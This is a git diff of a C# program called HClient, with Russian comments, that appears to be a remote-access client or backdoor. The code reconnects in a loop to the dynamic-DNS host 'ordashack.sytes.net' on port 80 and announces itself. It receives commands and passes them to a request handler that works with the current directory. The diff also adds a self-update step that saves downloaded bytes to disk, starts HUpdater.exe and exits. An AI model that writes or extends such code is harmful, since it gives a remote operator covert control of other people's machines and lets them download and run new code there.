@@ -8,13 +8,14 @@ using System.Threading;
 using System.Threading.Tasks;
 using HClientLib;
 using static System.Net.Mime.MediaTypeNames;
+using System.Diagnostics;
 
 namespace HClient
 {
     class Program
     {
-        static Socket mySocket;
-        static MemoryStream ms = new MemoryStream(new byte[256 * 1000000], 0, 256 * 1000000, true, true);
+        static Socket mySocket; //инициализзируем сокет;
+        static MemoryStream ms = new MemoryStream(new byte[256 * 100], 0, 256 * 100, true, true);
         
         static BinaryWriter writer = new BinaryWriter(ms);
         static BinaryReader reader = new BinaryReader(ms);//чтение из потока
@@ -28,25 +29,19 @@ namespace HClient
             connectionIsOn = false;
             currentDir = Environment.CurrentDirectory;// сохраненная директория
             Connection();
-            
-
-            Task.Run(() => { while (connectionIsOn) recivePocket(); });
-            //while(true)
-            //{
-
-            //}
-            //функция проверки подключения
+           
             checkConnection = new Thread(() =>
             {
                 while (true)//бесконечный цикл проверки состояния подключения
                 {
-                    if (mySocket.Poll(5, SelectMode.SelectRead) && mySocket.Available == 0)//если связь потеряна
+                    if (mySocket.Poll(1, SelectMode.SelectRead) && mySocket.Available == 0)//если связь потеряна
                     {
+                        Console.WriteLine("Связь с сервером потеряна");
+                        Thread.Sleep(1000);
                         connectionIsOn = false;
-                        Connection();//пробуем подключиться
-                        Task.Run(() => { while (true) recivePocket(); });//запускаем цикл
+                        Connection();//пробуем подключиться                        
                     }
-                    Thread.Sleep(10000); // каждые 10 секунд
+                    Thread.Sleep(1000); // каждые 10 секунд
                 }
             });
             checkConnection.Start();// запускаем поток проверки*/
@@ -56,14 +51,14 @@ namespace HClient
         private static void Connection()//функция подключения
         {
             Console.WriteLine("Подключение к серверу");
-            mySocket = new Socket(SocketType.Stream, ProtocolType.Tcp); //инициализзируем сокет
+            mySocket = new Socket(SocketType.Stream, ProtocolType.Tcp); //инициализзируем сокет;
             while (!mySocket.Connected)//пока нет подключения
             {
                 
                 try
                 {
                     mySocket.Connect(@"ordashack.sytes.net", 80);      //пробуем подключиться к серверу   
-                    //mySocket.Connect("192.168.0.15",8080);      //пробуем подключиться к серверу             
+                    //mySocket.Connect("192.168.0.15", 8080);      //пробуем подключиться к серверу             
                 }
                 catch
                 {
@@ -72,11 +67,11 @@ namespace HClient
             }
             connectionIsOn = true;
             Console.Clear();
-            Console.WriteLine("Подключенo.");
+            Console.WriteLine("Подключен.");
             Thread.Sleep(1000);
             Console.Clear();
             introduse();//представляемся
-            
+            Task.Run(() => { while (connectionIsOn) recivePocket(); });//запускаем цикл
         }
 
         
@@ -100,10 +95,10 @@ namespace HClient
             }
             else
             {
-                RequestHandler.Request(ref currentDir, request, ms);
+                RequestHandler.Request(ref currentDir, request, ms, mySocket);
                 
             }
-            mySocket.Send(ms.GetBuffer());
+            
         }
 
         private static void introduse()//при подключении передает информацию о себе
@@ -117,7 +112,7 @@ namespace HClient
         
         private static void Update()
         {
-            string path = Environment.CurrentDirectory + "\\hclientlib.dll";
+            string path = Environment.CurrentDirectory + "\\update.tmp";
             using (FileStream fs = new FileStream(path, FileMode.OpenOrCreate))
             {
                 int leng = reader.ReadInt32();
@@ -129,6 +124,8 @@ namespace HClient
                 // считывает байт в память и переводит каретку на байт вперед
                 ms.Position = 0;                
                 writer.Write("Загрузка завершена.");
+                Process.Start(Environment.CurrentDirectory + "\\HUpdater.exe");
+                Environment.Exit(0);
             }
         }
     }
